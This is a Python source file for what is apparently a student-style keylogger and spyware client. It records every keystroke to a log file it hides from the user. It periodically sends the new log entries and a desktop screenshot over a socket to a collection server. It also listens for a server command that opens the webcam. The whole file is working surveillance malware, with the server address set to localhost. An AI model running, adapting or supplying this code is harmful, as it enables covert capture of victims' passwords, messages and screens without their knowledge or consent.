import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading, cv2

from pynput.keyboard import Key, Listener


# Function to get the operating system of the client
def get_os():
    return platform.system()


# Function to configure the logging file
def setup_logging_file(filename):
    logging.basicConfig(
        filemode='a',
        filename=filename,
        datefmt='%d/%m/20%y %I:%M:%S',
        format='%(asctime)s %(message)s',
        level=logging.DEBUG
    )


# Function to hide the file
def hide_file(filename):
    if get_os() == 'Windows':
        if not os.path.exists(filename):
            open(filename, 'a').close()
        ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
    elif get_os() == 'Linux':
        os.system(f'chmod 777 {filename}')
        os.system(f'chattr +i {filename}')


# Function to log the key pressed
def listen_keyboard(key):
    logging.info(str(key))


# Function to send the log file to the server
def send_log_file(filename, host, port, last_position):
    try:
        with socket.create_connection((host, port)) as sock:
            filename_size = len(filename)
            sock.send(filename_size.to_bytes(4, 'big'))
            sock.send(filename.encode())
            with open(filename, 'rb') as file:
                file.seek(last_position)
                file_data = file.read(1024)
                while file_data:
                    sock.send(file_data)
                    file_data = file.read(1024)
                last_position = file.tell()
        print(f"\nLog file sent")
        return last_position
    except socket.error:
        print('Server unreachable ! The log file will be sent later')
        return last_position


# Function to take a screenshot
def take_screenshot(host, port):
    try:
        with socket.create_connection((host, port)) as sock:
            filename = datetime.datetime.today().strftime('%Hh%Mm%Ss.png')
            filename_size = len(filename)
            sock.send(filename_size.to_bytes(4, 'big'))
            sock.send(filename.encode())
            img = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            sock.sendall(img_bytes)
        print(f"Screenshot sent")
    except socket.error:
        print('Server unreachable ! The screenshot will be sent later')


# Function to open the webcam
def open_webcam():
    cv2.namedWindow("preview")
    vc = cv2.VideoCapture(0)

    if vc.isOpened():
        rval, frame = vc.read()
    else:
        rval = False

    while rval:
        cv2.imshow("preview", frame)
        rval, frame = vc.read()
        key = cv2.waitKey(20)
        if key == 27 or cv2.getWindowProperty('preview', cv2.WND_PROP_VISIBLE) < 1:
            break

    vc.release()
    cv2.destroyWindow("preview")


def receive_server_commands(host, port):
    with socket.create_connection((host, port)) as client_socket:
        while True:
            try:
                command = client_socket.recv(1024).decode()
                if command == 'CAPTURE':
                    open_webcam()
            except socket.error:
                print('Error receiving command from server')


# Function to start the listener
def start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time):
    with Listener(on_press=listen_keyboard) as listener:
        try:
            while time.time() - start_time < capture_duration:
                time.sleep(delay_send_log)
                listener.stop()
                last_position = send_log_file(filename, host, port, last_position)
                take_screenshot(host, port)
                listener = Listener(on_press=listen_keyboard)
                listener.start()
        except KeyboardInterrupt:
            listener.stop()


def main():
    host = 'localhost'
    port = 9809
    current_time = datetime.datetime.today().strftime('%d-%m-%Y %Hh')
    ip = str(socket.gethostbyname(socket.gethostname()))
    filename = f'{ip}_{current_time}_keyboard.txt'
    setup_logging_file(filename)
    hide_file(filename)
    last_position = 0
    capture_duration = 600
    start_time = time.time()
    delay_send_log = 10

    threading.Thread(target=receive_server_commands, args=(host, port)).start()
    start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time)


if __name__ == '__main__':
    main()
